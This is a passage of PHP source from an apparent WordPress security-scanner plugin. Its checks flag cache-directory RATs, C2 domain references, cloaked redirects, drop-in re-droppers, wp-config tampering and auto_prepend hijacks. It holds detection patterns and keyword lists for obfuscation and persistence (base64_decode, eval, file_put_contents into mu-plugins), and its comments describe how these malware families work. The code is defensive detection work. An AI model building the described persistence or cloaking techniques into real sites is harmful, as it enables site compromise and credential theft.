				if ( in_array( $file->getFilename(), $known_rat_filenames, true ) ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'Known RAT filename in cache directory (PHP backdoor)',
						'subject'     => $file->getFilename(),
						'path'        => $file->getPathname(),
						'action'      => 'Delete immediately  this file is not a legitimate cache artefact',
						'auto_delete' => true,
						'delete_path' => $file->getPathname(),
					];
					continue;
				}

				// Any other non-trivial PHP in cache: signature scan first.
				$contents = @file_get_contents( $file->getPathname() );
				if ( ! $contents ) continue;

				if ( self::is_whitelisted( $contents ) ) continue;

				$matched_sig = null;
				foreach ( $all_sigs as $sig ) {
					if ( strpos( $contents, $sig ) !== false ) {
						if ( self::is_whitelisted_match( $file->getPathname(), $sig ) ) continue;
						$matched_sig = $sig;
						break;
					}
				}

				if ( $matched_sig !== null ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'Malware signature in cache directory PHP file (' . self::sig_family( $matched_sig ) . ')',
						'subject'     => $file->getFilename(),
						'path'        => $file->getPathname(),
						'action'      => 'Delete immediately  PHP with malware signatures must never exist in the cache directory',
						'match'       => $matched_sig,
						'auto_delete' => true,
						'delete_path' => $file->getPathname(),
					];
				} else {
					// PHP file in cache with no signature match  still unusual;
					// flag for manual review but do not auto-delete.
					$found[] = [
						'severity' => 'high',
						'type'     => 'Unexpected PHP file in cache directory (no signature match  manual review required)',
						'subject'  => $file->getFilename(),
						'path'     => $file->getPathname(),
						'action'   => 'Inspect contents and delete if not a recognised cache plugin file',
					];
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'Cache dir scan error: ' . $e->getMessage() );
		}
		return $found;
	}

	/**
	 * Detect .htaccess false-security on malware plugin folders (added v1.3.0).
	 *
	 * A common operator error: placing a Deny-from-all .htaccess inside a
	 * malware plugin folder and believing the threat is neutralised. It is not.
	 *
	 * Apache's .htaccess governs HTTP request routing only. WordPress loads
	 * plugins by reading the filesystem and calling require_once()  an
	 * internal PHP operation that Apache never sees. A malware plugin with
	 * a blocking .htaccess still executes completely on every page load.
	 *
	 * This check looks for the specific combination:
	 *   1. A plugin folder slug matching a known malware pattern.
	 *   2. A .htaccess file inside that folder containing a Deny directive.
	 *   3. The plugin is still listed in the active_plugins option.
	 *
	 * Condition 3 is the critical one: if it is still active, every page
	 * request loads the malware regardless of .htaccess. The finding severity
	 * is 'critical' in that case and 'high' if the folder exists with a
	 * .htaccess but is already deactivated (folder still needs deletion).
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_htaccess_false_security(): array {
		$found = [];
		if ( ! is_dir( WP_PLUGIN_DIR ) ) {
			return $found;
		}

		// Build a flat list of active plugin slugs for quick lookup.
		$active_plugins = get_option( 'active_plugins', [] );
		$active_slugs   = [];
		foreach ( $active_plugins as $plugin_file ) {
			$active_slugs[] = strtolower( explode( '/', $plugin_file )[0] );
		}

		// Malware slug patterns to check (same families as check_plugin_folders).
		$malware_patterns = [
			'wp-perf-analytics',
			'native-render-toolkit',
			'total-render-profiler',
			'total-render-toolkit',
			'pro-font-optimizer',
			'site-speed-insights',
			'advanced-asset-insights', // 1.3.37
			'page-seo-toolkit',        // 1.3.39
			'starter-image-guard',     // 1.3.39
			'auto-content-profiler',   // 1.3.58
			'pro-cache-scanner',       // 1.3.68
			'total-database-optimizer', // 1.3.69
			'session-manager',
			'antymalwary',
			'wpconsole',
			'wp-performance-booster',
		];

		$dirs = glob( WP_PLUGIN_DIR . '/*', GLOB_ONLYDIR );
		if ( ! is_array( $dirs ) ) {
			return $found;
		}

		foreach ( $dirs as $dir ) {
			$folder  = basename( $dir );
			$htaccess = $dir . '/.htaccess';

			if ( ! file_exists( $htaccess ) ) {
				continue;
			}

			// Check if this folder matches a malware pattern.
			$is_malware = WPS_Blocker::is_blocked( $folder . '/' . $folder . '.php' );
			if ( ! $is_malware ) {
				foreach ( $malware_patterns as $pat ) {
					if ( strpos( strtolower( $folder ), $pat ) !== false ) {
						$is_malware = true;
						break;
					}
				}
			}
			if ( ! $is_malware ) {
				continue;
			}

			// Check .htaccess actually contains a Deny directive.
			$htaccess_content = @file_get_contents( $htaccess );
			if ( ! $htaccess_content || stripos( $htaccess_content, 'Deny' ) === false ) {
				continue;
			}

			$still_active = in_array( strtolower( $folder ), $active_slugs, true );
			$severity     = $still_active ? 'critical' : 'high';
			$active_note  = $still_active
				? 'STILL ACTIVE IN WORDPRESS: the malware is executing on every page load despite the .htaccess block. '
				: 'Plugin is deactivated but the folder is still on disk and must be deleted. ';

			$found[] = [
				'severity' => $severity,
				'type'     => '.htaccess does not stop malware execution  folder must be deleted',
				'subject'  => $folder,
				'path'     => $dir,
				'action'   => $active_note
					. '.htaccess blocks HTTP access only. WordPress loads plugins via PHP require_once() internally  '
					. 'Apache rules have no effect on that path. Delete the entire folder: rm -rf ' . $dir,
			];
		}
		return $found;
	}

	/**
	 * Detect wp-content root drop-ins used to resurrect the session-manager MU plugin.
	 *
	 * Confirmed sample: advanced-cache.php with marker _sm_ac_v5. It disables cache,
	 * reads wp_session_tokens_config from wp_options, base64-decodes it, and writes
	 * wp-content/mu-plugins/session-manager.php back to disk.
	 *
	 * @return array<int, array<string, mixed>>
	 */

	/**
	 * Detect referer/User-Agent-cloaked external redirects in .htaccess
	 * doorway cloaking. A RewriteCond on HTTP_REFERER or HTTP_USER_AGENT paired
	 * with a RewriteRule that redirects to an absolute URL on a *different* host
	 * is the classic pattern for sending only search-engine visitors (or only
	 * crawlers) off to an external pharma/casino/spam destination while ordinary
	 * visitors and the site owner see nothing. This walker had zero coverage
	 * before 1.3.97: every other check reads PHP, and this artefact lives purely
	 * in rewrite rules.
	 *
	 * Review-only. Legitimate hotlink-protection rules also condition on
	 * HTTP_REFERER, so this reports the offending rule for a human to judge
	 * rather than auto-editing .htaccess; the action text explains the tell.
	 *
	 * @return array<int, array<string, string>>
	 */
	/**
	 * 1.3.98: unified C2 reference sweep. Every family detector matches its own
	 * structural shape; this check instead matches the one thing every build of
	 * a campaign shares - its C2 domain - across ALL PHP-executable content
	 * under wp-content and the web root's top level, using the merged catalogue
	 * from WPS_Indicators::all_c2_domains(). A rotated loader with a new shape
	 * but a known C2 is caught here before a structural detector exists for it.
	 *
	 * Review-only: security tooling legitimately ships blocklists containing
	 * malicious domains, so a bare domain match must be judged by a human. The
	 * victim-site list is never swept.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_c2_references(): array {
		$found = [];
		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'all_c2_domains' ) ) {
			return $found;
		}
		$domains = WPS_Indicators::all_c2_domains();
		if ( ! $domains ) {
			return $found;
		}

		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$count    = 0;

		$scan_one = function ( $f ) use ( &$found, &$count, $domains, $self_dir ): bool {
			if ( ++$count > self::REDROP_MAX_SCAN_FILES ) return false;
			if ( ! self::is_php_executable( $f ) || ! $f->isReadable() ) return true;
			if ( $f->getSize() > 524288 ) return true; // 512 KiB cap

			$path = $f->getPathname();
			$real = realpath( $path );
			if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) return true;
			if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) return true;

			$contents = @file_get_contents( $path );
			if ( $contents === false || $contents === '' ) return true;
			if ( self::is_whitelisted( $contents ) ) return true;

			$lower = strtolower( $contents );
			foreach ( $domains as $domain ) {
				if ( strpos( $lower, strtolower( $domain ) ) !== false ) {
					$found[] = [
						'severity' => 'critical',
						'type'     => 'Known C2 domain referenced in PHP file',
						'subject'  => basename( $path ) . ' references ' . $domain,
						'path'     => $path,
						'match'    => $domain,
						'action'   => 'This file contains the catalogued C2 domain "' . $domain . '". Every confirmed use of this domain in the tracked campaigns is malicious. Review the file: if it is not a security tool carrying a blocklist, treat it as an active implant and remove it. Reported for review because blocklists legitimately contain such domains.',
					];
					break; // one finding per file
				}
			}
			return true;
		};

		try {
			if ( defined( 'WP_CONTENT_DIR' ) && is_dir( WP_CONTENT_DIR ) ) {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( WP_CONTENT_DIR, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( ! ( $f instanceof SplFileInfo ) ) continue;
					if ( ! $scan_one( $f ) ) break;
				}
			}
		} catch ( \Exception $e ) {}

		if ( defined( 'ABSPATH' ) && is_dir( ABSPATH ) ) {
			try {
				foreach ( new DirectoryIterator( ABSPATH ) as $f ) {
					if ( $f->isDot() || ! $f->isFile() ) continue;
					if ( ! $scan_one( $f ) ) break;
				}
			} catch ( \Exception $e ) {}
		}

		return $found;
	}

	/**
	 * 1.3.98: redirect injection in theme functions.php - the classic
	 * traffic-theft persistence. Requires BOTH a redirect primitive (PHP
	 * header/wp_redirect to an external absolute URL, an echoed JS
	 * window.location/location.href, or a meta refresh) AND a cloaking or
	 * obfuscation tell (base64/gzinflate/eval/str_rot13/hex-escape decode, or a
	 * gate on cookies, referer, user-agent, or logged-in state). Legitimate
	 * themes redirect - canonical rules, maintenance pages - so the primitive
	 * alone is never flagged; the primitive plus a tell is the injection shape.
	 *
	 * Walks every theme (the 1.3.97 lesson: dormant themes are not a dead
	 * zone). Review-only: functions.php of an active theme is surgical-clean
	 * territory and deleting it takes the site down.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_functions_redirect_injection(): array {
		$found = [];
		$themes_root = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR . '/themes' : '';
		if ( $themes_root === '' || ! is_dir( $themes_root ) ) {
			return $found;
		}

		$site_host = '';
		if ( function_exists( 'home_url' ) ) {
			$site_host = strtolower( (string) parse_url( home_url(), PHP_URL_HOST ) );
		}

		foreach ( (array) @scandir( $themes_root ) as $slug ) {
			if ( $slug === '.' || $slug === '..' ) continue;
			$funcs = $themes_root . '/' . $slug . '/functions.php';
			if ( ! is_file( $funcs ) || ! is_readable( $funcs ) ) continue;
			if ( @filesize( $funcs ) > 1048576 ) continue; // 1 MiB cap

			$contents = @file_get_contents( $funcs );
			if ( $contents === false || $contents === '' ) continue;
			if ( self::is_whitelisted( $contents ) ) continue;

			// Redirect primitive aimed at an absolute external URL.
			$primitive = '';
			if ( preg_match( '/(?:header\s*\(\s*[\'"]\s*Location:\s*|wp_redirect\s*\(\s*[\'"])(https?:\/\/[^\'"\s]+)/i', $contents, $m )
				|| preg_match( '/(?:window\.location(?:\.href)?|location\.href)\s*=\s*[\\\\]?[\'"](https?:\/\/[^\'"\s]+)/i', $contents, $m )
				|| preg_match( '/http-equiv=[\\\\]?[\'"]refresh[\\\\]?[\'"][^>]*url=(https?:\/\/[^\'"\s>]+)/i', $contents, $m ) ) {
				$target_host = strtolower( (string) parse_url( $m[1], PHP_URL_HOST ) );
				if ( $target_host !== '' && $target_host !== $site_host
					&& ( $site_host === '' || substr( $target_host, - ( strlen( $site_host ) + 1 ) ) !== '.' . $site_host ) ) {
					$primitive = $m[0];
				}
			}
			// Or a redirect whose destination is decoded at runtime (hidden target).
			if ( $primitive === '' && preg_match( '/(?:header|wp_redirect)\s*\(\s*(?:[\'\"][^\'\"]*[\'\"]\s*\.\s*)?(?:base64_decode|gzinflate|str_rot13|strrev)\s*\(/i', $contents, $m ) ) {
				$primitive = $m[0];
			}
			if ( $primitive === '' ) continue;

			// Cloaking / obfuscation tell.
			$tell = '';
			foreach ( [
				'/base64_decode\s*\(|gzinflate\s*\(|gzuncompress\s*\(|str_rot13\s*\(/i' => 'encoded payload/target',
				'/\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}/i'                                   => 'hex-escaped strings',
				'/HTTP_USER_AGENT|HTTP_REFERER/i'                                       => 'referer/user-agent cloaking',
				'/!\s*is_user_logged_in\s*\(|\$_COOKIE\s*\[/i'                          => 'visitor-only / cookie gating',
				'/\beval\s*\(/i'                                                        => 'eval',
			] as $re => $label ) {
				if ( preg_match( $re, $contents ) ) { $tell = $label; break; }
			}
			if ( $tell === '' ) continue;

			$found[] = [
				'severity' => 'critical',
				'type'     => 'Redirect injection in theme functions.php',
				'subject'  => $slug . '/functions.php',
				'path'     => $funcs,
				'match'    => substr( $primitive, 0, 160 ) . ' [+ ' . $tell . ']',
				'action'   => 'functions.php in the "' . $slug . '" theme contains a redirect primitive combined with ' . $tell . ' - the injected traffic-theft shape, since legitimate theme redirects need neither cloaking nor encoding. Open the file and remove the injected block (usually appended at the top or bottom, away from the theme\'s own code). Reported for review: deleting functions.php outright takes the theme down.',
			];
		}

		return $found;
	}

	private static function check_htaccess_redirects(): array {
		$found = [];

		$site_host = '';
		if ( function_exists( 'home_url' ) ) {
			$site_host = strtolower( (string) parse_url( home_url(), PHP_URL_HOST ) );
		}

		$targets = [];
		if ( defined( 'ABSPATH' ) )        $targets[] = rtrim( ABSPATH, '/\\' ) . '/.htaccess';
		if ( defined( 'WP_CONTENT_DIR' ) ) {
			$targets[] = WP_CONTENT_DIR . '/.htaccess';
			$targets[] = WP_CONTENT_DIR . '/uploads/.htaccess';
		}
		$targets = array_values( array_unique( $targets ) );

		foreach ( $targets as $file ) {
			if ( ! is_file( $file ) || ! is_readable( $file ) ) continue;
			if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $file ) ) continue;
			if ( filesize( $file ) > 262144 ) continue; // 256 KiB cap; real .htaccess files are tiny

			$contents = @file_get_contents( $file );
			if ( $contents === false || $contents === '' ) continue;

			$lines   = preg_split( '/\r\n|\r|\n/', $contents );
			$pending = [];  // RewriteCond lines awaiting their RewriteRule

			foreach ( $lines as $raw ) {
				$line = trim( $raw );
				if ( $line === '' || $line[0] === '#' ) continue;

				if ( stripos( $line, 'RewriteCond' ) === 0 ) {
					$pending[] = $line;
					continue;
				}

				if ( stripos( $line, 'RewriteRule' ) !== 0 ) {
					// A blank-separated non-rule statement ends the current cond group.
					if ( stripos( $line, 'Rewrite' ) !== 0 ) $pending = [];
					continue;
				}

				// This RewriteRule consumes the pending conditions.
				$conds   = $pending;
				$pending = [];

				// Target must be an absolute URL on another host.
				if ( ! preg_match( '#https?://([^/\s"\']+)#i', $line, $m ) ) continue;
				$target_host = strtolower( $m[1] );
				if ( $site_host !== '' && ( $target_host === $site_host
					|| substr( $target_host, - ( strlen( $site_host ) + 1 ) ) === '.' . $site_host ) ) {
					continue; // same site (or a subdomain of it) not a cloaked exfil redirect
				}

				// A condition on referer or UA is the cloaking tell.
				$cond_blob = strtolower( implode( ' ', $conds ) );
				$on_referer = strpos( $cond_blob, 'http_referer' ) !== false;
				$on_ua      = strpos( $cond_blob, 'http_user_agent' ) !== false;
				if ( ! $on_referer && ! $on_ua ) continue;

				$engine_ref = (bool) preg_match( '/google|bing|yahoo|yandex|duckduckgo|baidu|ask\.com/', $cond_blob );
				$bot_ua     = (bool) preg_match( '/bot|crawl|spider|slurp|mediapartners|adsbot/', $cond_blob );

				$why = $on_referer ? 'HTTP_REFERER' : 'HTTP_USER_AGENT';
				$emphasis = ( $engine_ref || $bot_ua )
					? ' The condition targets ' . ( $engine_ref ? 'search-engine referers' : 'crawler user-agents' )
						. ', which is the doorway-cloaking signature rather than hotlink protection.'
					: '';

				$rel = $file;
				if ( defined( 'ABSPATH' ) ) {
					$abs = rtrim( str_replace( '\\', '/', ABSPATH ), '/' ) . '/';
					$norm = str_replace( '\\', '/', $file );
					if ( strpos( $norm, $abs ) === 0 ) $rel = substr( $norm, strlen( $abs ) );
				}

				$found[] = [
					'severity' => 'high',
					'type'     => 'Cloaked external redirect in .htaccess (doorway)',
					'subject'  => $rel . ' -> ' . $target_host,
					'path'     => $file,
					'match'    => $line,
					'action'   => 'Review this rule: it redirects visitors to the external host "' . $target_host
						. '" but only when ' . $why . ' matches a condition.' . $emphasis
						. ' If you did not add a deliberate hotlink or canonical-redirect rule, remove the RewriteCond/RewriteRule block from '
						. $rel . '. This is reported for review only WP Perf Shield does not edit .htaccess automatically.',
				];
			}
		}

		return $found;
	}
	private static function check_wp_content_dropins(): array {
		$found = [];
		$files = [
			WP_CONTENT_DIR . '/advanced-cache.php',
			WP_CONTENT_DIR . '/object-cache.php',
			WP_CONTENT_DIR . '/db.php',
			WP_CONTENT_DIR . '/sunrise.php',
		];

		foreach ( $files as $file ) {
			if ( ! is_file( $file ) || ! is_readable( $file ) ) {
				continue;
			}

			$contents = @file_get_contents( $file );
			if ( $contents === false ) {
				continue;
			}

			$markers = [
				'wp_session_tokens_config',
				'base64_decode',
				'file_put_contents',
				'session-manager.php',
			];
			$hits = [];
			foreach ( $markers as $marker ) {
				if ( strpos( $contents, $marker ) !== false ) {
					$hits[] = $marker;
				}
			}

			if ( count( $hits ) >= 3 || strpos( $contents, '_sm_ac_v5' ) !== false ) {
				$found[] = [
					'severity'    => 'critical',
					'type'        => 'Malicious wp-content drop-in persistence loader',
					'subject'     => basename( $file ),
					'path'        => $file,
					'action'      => 'Delete this drop-in and remove wp_session_tokens_config from the database, or the MU plugin can be restored.',
					'match'       => implode( ', ', $hits ?: [ '_sm_ac_v5' ] ),
					'auto_delete' => true,
					'delete_path' => $file,
				];
			} else {
				// 1.3.82: generalised re-dropper detection, independent of the
				// session-manager identifiers above. A wp-content drop-in that
				// decodes a blob and writes a PHP file into the auto-loading
				// mu-plugins directory is a persistence re-dropper regardless of
				// the option name, marker, or target filename it uses. This catches
				// renamed variants (e.g. a db.php / advanced-cache.php pair that
				// restores mu-plugins/<renamed>.php) that the lineage-specific
				// markers above miss.
				$decode_fns = [ 'base64_decode', 'gzinflate', 'gzuncompress', 'str_rot13', 'convert_uudecode' ];
				$has_decode = false;
				foreach ( $decode_fns as $decode_fn ) {
					if ( strpos( $contents, $decode_fn ) !== false ) {
						$has_decode = true;
						break;
					}
				}
				$writes_payload   = strpos( $contents, 'file_put_contents' ) !== false
					|| strpos( $contents, 'fwrite' ) !== false
					|| strpos( $contents, 'fputs' ) !== false;
				$targets_muplugin = strpos( $contents, 'mu-plugins' ) !== false
					|| strpos( $contents, 'WPMU_PLUGIN_DIR' ) !== false;

				if ( $has_decode && $writes_payload && $targets_muplugin ) {
					$found[] = [
						'severity'    => 'critical',
						'type'        => 'Malicious wp-content drop-in re-dropper (writes obfuscated payload to mu-plugins)',
						'subject'     => basename( $file ),
						'path'        => $file,
						'action'      => 'Delete this drop-in. It decodes and rewrites an MU plugin on every page load, so the restored MU plugin in mu-plugins/ must be deleted as well or it will return. Also remove any unexpected DB option this loader references.',
						'match'       => 'decode + payload-write + mu-plugins target',
						'auto_delete' => true,
						'delete_path' => $file,
					];
				}
			}
		}

		return $found;
	}

	/**
	 * wp-config.php integrity monitor (added v1.2.1).
	 *
	 * On the first clean run after activation, hashes wp-config.php with
	 * SHA-256 and stores the hash in a persistent option. On every subsequent
	 * run the hash is recomputed and compared. A mismatch means the file was
	 * modified since the last verified-clean state, which is a high-confidence
	 * indicator of credential theft (the RAT's mode-q reads wp-config.php
	 * directly for DB credentials) or persistence injection.
	 *
	 * The stored hash is updated silently when the admin manually clears the
	 * finding from the dashboard (indicating an intentional edit), or when the
	 * operator chooses to re-baseline via the Danger Zone in Settings.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_wp_config_integrity(): array {
		$config = rtrim( ABSPATH, '/\\' ) . '/wp-config.php';
		if ( ! file_exists( $config ) || ! is_readable( $config ) ) {
			return [];
		}

		$current_hash = hash_file( 'sha256', $config );
		if ( $current_hash === false ) {
			return [];
		}

		$stored = get_option( 'wps_wpconfig_hash', '' );

		if ( $stored === '' ) {
			// First run  store baseline hash silently.
			update_option( 'wps_wpconfig_hash', $current_hash );
			WPS_Logger::log_event( 'wp_config_hash_stored', 'Baseline SHA-256 stored: ' . substr( $current_hash, 0, 16 ) . '' );
			return [];
		}

		if ( ! hash_equals( $stored, $current_hash ) ) {
			WPS_Logger::log_event(
				'wp_config_modified',
				'Hash changed: stored=' . substr( $stored, 0, 16 ) . ' current=' . substr( $current_hash, 0, 16 ) . ''
			);
			return [ [
				'severity' => 'critical',
				'type'     => 'wp-config.php modified since last verified-clean state',
				'subject'  => 'wp-config.php',
				'path'     => $config,
				'action'   => 'Review changes immediately. If the edit was intentional, re-baseline via Settings  Danger Zone  Reset wp-config.php baseline.',
				'match'    => 'hash mismatch: ' . substr( $stored, 0, 16 ) . '  ' . substr( $current_hash, 0, 16 ) . '',
			] ];
		}

		return [];
	}

	/**
	 * 1.4.55: configuration backups sitting in the web root.
	 *
	 * `wp-config.php` is the one file whose disclosure is immediately fatal:
	 * database credentials, table prefix, and every authentication salt. PHP
	 * protects it by executing it, so a request returns nothing. Rename it to
	 * anything the server does not parse as PHP and that protection is gone -
	 * `wp-config.php.bak` is served as plain text.
	 *
	 * These come from editors (`~`, `.swp`), from host and panel backup
	 * features, from developers working quickly, and - until 1.4.55 - from WP
	 * Perf Shield's own hardening routine, which wrote `wp-config.php.wps.bak`
	 * beside the original every time it edited the file. Upgrading stops new
	 * ones appearing; it cannot remove those already there, so they are
	 * reported.
	 *
	 * Only files that actually contain credentials are reported. A name that
	 * merely looks like a config backup is not evidence, and a scanner that
	 * cries wolf over an empty `wp-config.php.bak` teaches operators to ignore
	 * it.
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_exposed_config_backup(): array {
		$found = [];
		$root  = rtrim( ABSPATH, '/\\' );
		if ( ! is_dir( $root ) ) {
			return $found;
		}

		$entries = @scandir( $root );
		if ( ! is_array( $entries ) ) {
			return $found;
		}

		foreach ( $entries as $name ) {
			if ( $name === '.' || $name === '..' ) {
				continue;
			}
			if ( stripos( $name, 'wp-config' ) === false ) {
				continue;
			}
			$lower = strtolower( $name );
			if ( $lower === 'wp-config.php' || $lower === 'wp-config-sample.php' ) {
				continue;
			}
			if ( substr( $lower, -4 ) === '.php' ) {
				continue; // still parsed by the server, so not disclosed this way
			}

			$path = $root . DIRECTORY_SEPARATOR . $name;
			if ( ! is_file( $path ) ) {
				continue;
			}
			if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) {
				continue;
			}

			$size = @filesize( $path );
			if ( $size === false || $size < 64 || $size > 1048576 ) {
				continue;
			}

			$head = @file_get_contents( $path, false, null, 0, 65536 );
			if ( $head === false ) {
				continue;
			}

			// Confirm it holds real secrets before calling it an exposure.
			$secrets = 0;
			foreach ( [ 'DB_NAME', 'DB_USER', 'DB_PASSWORD', 'AUTH_KEY', 'SECURE_AUTH_KEY', 'LOGGED_IN_KEY', 'NONCE_KEY', 'AUTH_SALT' ] as $needle ) {
				if ( strpos( $head, $needle ) !== false ) {
					$secrets++;
				}
			}
			if ( $secrets < 2 ) {
				continue;
			}

			$ours = ( stripos( $name, '.wps.bak' ) !== false || stripos( $name, '.wps-clean.bak' ) !== false );

			$found[] = [
				'severity' => 'critical',
				'type'     => 'Readable wp-config backup in the web root - database credentials and salts are exposed',
				'subject'  => $name,
				'path'     => $path,
				'action'   => 'Move this file out of the web root or delete it now. '
					. 'Because it may already have been fetched, treat the credentials as disclosed: '
					. 'change the database password and rotate the salts (Hardening, then Rotate salts).'
					. ( $ours
						? ' This file was written by WP Perf Shield hardening before 1.4.55, which is fixed - backups now go to quarantine. Deleting it is safe: the constants it protected are already in wp-config.php.'
						: '' ),
				'match'    => $secrets . ' credential constants in a file the web server will serve as text ('
					. size_format( (int) $size ) . ')',
			];
		}

		return $found;
	}

	/** @return array<int, array<string, string>> */
	private static function check_wp_config_malware(): array {
		if ( ! class_exists( 'WPS_Hardening' ) ) {
			return [];
		}

		$matches = WPS_Hardening::scan_wpconfig_malware();
		if ( empty( $matches ) ) {
			return [];
		}

		$labels = [];
		foreach ( $matches as $match ) {
			$labels[] = (string) ( $match['label'] ?? 'wp-config.php malware pattern' );
		}
		$labels = array_values( array_unique( $labels ) );

		return [ [
			'severity' => 'critical',
			'type'     => 'wp-config.php contains removable malware pattern',
			'subject'  => 'wp-config.php',
			'path'     => rtrim( ABSPATH, '/\\' ) . '/wp-config.php',
			'action'   => 'Use Remediation  Clean wp-config.php to remove known patterns after a backup is created, then review the file manually.',
			'match'    => implode( ', ', $labels ),
		] ];
	}

	/** @return array<int, array<string, string>> */
	private static function check_high_risk_plugins(): array {
		$found = [];
		foreach ( self::HIGH_RISK_PLUGINS as $slug => $reason ) {
			if ( is_dir( WP_PLUGIN_DIR . '/' . $slug ) ) {
				$found[] = [
					'severity' => 'high',
					'type'     => 'High-risk or known-malicious plugin installed',
					'subject'  => $slug,
					'path'     => WP_PLUGIN_DIR . '/' . $slug,
					'action'   => $reason,
				];
			}
		}
		return $found;
	}

	/** @return array<int, array<string, string>> */
	private static function check_orphaned_db_entries(): array {
		$found  = [];
		$active = get_option( 'active_plugins', [] );
		if ( ! is_array( $active ) ) {
			return $found;
		}
		$dirty = false;
		foreach ( $active as $k => $plugin_file ) {
			if ( ! is_string( $plugin_file ) ) continue;
			if ( ! file_exists( WP_PLUGIN_DIR . '/' . $plugin_file ) ) {
				unset( $active[ $k ] );
				$dirty = true;
				WPS_Logger::log_event( 'auto_deactivated_orphan', $plugin_file );
				$found[] = [
					'severity'   => 'medium',
					'type'       => 'Active plugin missing from disk (orphaned DB entry)',
					'subject'    => $plugin_file,
					'path'       => WP_PLUGIN_DIR . '/' . $plugin_file,
					'action'     => ' Auto-deactivated by WP Perf Shield',
					'remediated' => true,
				];
			}
		}
		if ( $dirty ) {
			update_option( 'active_plugins', array_values( $active ) );
		}
		return $found;
	}

	/** @return array<int, array<string, string>> */
	private static function check_cron_tampering(): array {
		$found     = [];
		$cron_file = ABSPATH . 'wp-cron.php';
		if ( ! file_exists( $cron_file ) || ! is_readable( $cron_file ) ) {
			return $found;
		}
		$contents = @file_get_contents( $cron_file );
		if ( ! $contents ) {
			return $found;
		}
		$bad  = [ 'wp-antymalwary', 'wpconsole', 'wp-performance-booster', 'base64_decode', 'eval(', 'file_put_contents' ];
		$hits = [];
		foreach ( $bad as $b ) {
			if ( strpos( $contents, $b ) !== false ) {
				$hits[] = $b;
			}
		}
		if ( $hits ) {
			$found[] = [
				'severity' => 'critical',
				'type'     => 'wp-cron.php has been tampered (WP-antymalwary-bot persistence)',
				'subject'  => 'wp-cron.php',
				'path'     => $cron_file,
				'action'   => 'Use Remediation tab > Replace wp-cron.php. Matched: ' . implode( ', ', $hits ),
			];
		}
		return $found;
	}

	/**
	 * Detect auto_prepend_file hijack and ABSPATH-root toolkit-filename injection
	 * (added 1.3.34).
	 *
	 * Three angles, all triggered by the .sbs cookie-exfil toolkit observed in
	 * the field as a `wordfence-waf.php` injection:
	 *
	 *   1. wordfence-waf.php at ABSPATH may have been edited to include a
	 *      malicious payload above the Wordfence bootstrap. The genuine file
	 *      only includes wp-content/plugins/wordfence{,-protect}/waf/bootstrap.php;
	 *      any other include/require/include_once/require_once is flagged.
	 *
	 *   2. .user.ini and .htaccess at ABSPATH may carry an auto_prepend_file
	 *      directive. We allow the canonical wordfence-waf.php (and an unset
	 *      or 'none' value); anything else, especially out-of-tree paths or
	 *      hidden-named files, is flagged.
	 *
	 *   3. Any non-wp-config PHP file at ABSPATH root that contains a substring
	 *      match for one of the secondary backdoor filenames is flagged. This
	 *      catches generic prepend injections that aren't wordfence-waf.php
	 *      specific (e.g., a malicious include line dropped into wp-load.php).
	 *
	 * @return array<int, array<string, string>>
	 */
	private static function check_auto_prepend_hijack(): array {
		$found        = [];
		$abspath_real = realpath( ABSPATH );
		if ( ! $abspath_real ) {
			return $found;
		}
		$abspath_norm = rtrim( str_replace( '\\', '/', $abspath_real ), '/' );

		//  1. wordfence-waf.php content check
		$wf_waf = ABSPATH . 'wordfence-waf.php';
		if ( file_exists( $wf_waf ) && is_readable( $wf_waf ) ) {
			$contents = @file_get_contents( $wf_waf );
			if ( is_string( $contents ) && $contents !== '' ) {
				// Canonical Wordfence WAF only includes one of these paths.
				$allowed_substrings = [
					'wp-content/plugins/wordfence/waf/bootstrap.php',
					'wp-content/plugins/wordfence-protect/waf/bootstrap.php',
				];
				if ( preg_match_all(
					'/(?:include|include_once|require|require_once)\s*\(?\s*[\'"]([^\'"]+)[\'"]/i',
					$contents,
					$matches
				) ) {
					foreach ( $matches[1] as $included ) {
						$included_norm = str_replace( '\\', '/', $included );
						$is_allowed    = false;
						foreach ( $allowed_substrings as $sub ) {
							if ( strpos( $included_norm, $sub ) !== false ) {
								$is_allowed = true;
								break;
							}
						}
						if ( ! $is_allowed ) {
							$found[] = [
								'severity'       => 'critical',
								'type'           => 'wordfence-waf.php auto_prepend hijack: non-canonical include',
								'subject'        => 'wordfence-waf.php includes ' . $included,
								'path'           => $wf_waf,
								'match'          => $included,
								// 1.3.67: clean_strategy signals the Overview-tab renderer
								// to show an inline "Clean injection" button. The handler
								// `wps_clean_wfwaf_include` reads this finding's `match`
								// (the offending include path), backs up the file, and
								// removes the specific line that contains an
								// include/require directive referencing that path.
								'clean_strategy' => 'wfwaf_hijack',
								'action'         => 'Use the Clean injection button to remove the malicious include line; or edit wordfence-waf.php manually. After cleaning: delete the referenced payload file and run Hardening > Regenerate auth salts to invalidate any cookies the malicious prepend has already exfiltrated.',
							];
						}
					}
				}
			}
		}

		//  2. .user.ini / .htaccess auto_prepend_file directive
		foreach ( [ '.user.ini', '.htaccess' ] as $cfg_name ) {
			$cfg_path = ABSPATH . $cfg_name;
			if ( ! file_exists( $cfg_path ) || ! is_readable( $cfg_path ) ) {
				continue;
			}
			$cfg_contents = @file_get_contents( $cfg_path );
			if ( ! is_string( $cfg_contents ) || $cfg_contents === '' ) {
				continue;
			}
			// .user.ini:  auto_prepend_file = "/path/to/file.php"
